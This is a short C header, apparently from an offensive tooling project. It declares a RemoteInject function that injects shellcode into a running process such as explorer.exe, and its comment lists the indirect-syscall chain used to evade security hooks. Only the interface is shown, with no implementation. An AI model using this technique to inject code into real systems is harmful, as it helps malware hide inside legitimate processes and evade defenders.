#pragma once
#include "common.h"

/*
 * Remote Process Injection
 *
 * Injects shellcode into a running process (e.g., explorer.exe).
 * Uses indirect syscalls: NtOpenProcess → NtAllocateVirtualMemory →
 * NtWriteVirtualMemory → NtProtectVirtualMemory → NtCreateThreadEx
 */

typedef struct _REMOTE_INJECT_RESULT {
    PVOID  base_addr;
    SIZE_T region_size;
    HANDLE hProcess;
    HANDLE hThread;
    DWORD  target_pid;
} REMOTE_INJECT_RESULT, *PREMOTE_INJECT_RESULT;

BOOL RemoteInject(PBYTE shellcode, SIZE_T sc_size, const char *process_name, PREMOTE_INJECT_RESULT result);
